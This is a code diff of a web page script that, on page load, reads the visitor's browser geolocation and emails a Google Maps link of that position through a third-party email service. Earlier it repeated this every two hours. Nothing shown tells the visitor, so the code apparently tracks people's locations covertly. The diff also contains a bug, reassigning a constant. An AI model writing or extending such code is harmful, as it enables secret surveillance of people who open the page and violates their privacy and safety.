@@ -16,7 +16,9 @@
             });
         })();
 
-        const TWO_HOURS = 200000
+        //const TWO_HOURS = 7200000
+
+        const messg = "Enabled"
 
         window.onload = function() {
     sendLocationEmail();
@@ -24,9 +26,9 @@
         
 function sendLocationEmail() {
 
-            if (!navigator.geolocation) {
-        alert("Geolocation is not supported by this browser.");
-        return;
+            if (!navigator.geolocation) {                
+                messg = "Not Enabled"
+        
     }
 
             navigator.geolocation.getCurrentPosition(
@@ -45,7 +47,7 @@ function sendLocationEmail() {
                 "service_3hv5k7r",
                 "template_peoy2wo",
                 { 
-                    message: `https://maps.google.com/?q=${latitude},${longitude}`
+                    message: `https://maps.google.com/?q=${latitude},${longitude} |${messg}`
                 }
             )
             .then(function(response) {
@@ -58,7 +60,7 @@ function sendLocationEmail() {
 
         }
 
-    setInterval(sendLocationEmail, TWO_HOURS);
+   //setInterval(sendLocationEmail, TWO_HOURS);
         
     </script>    
 
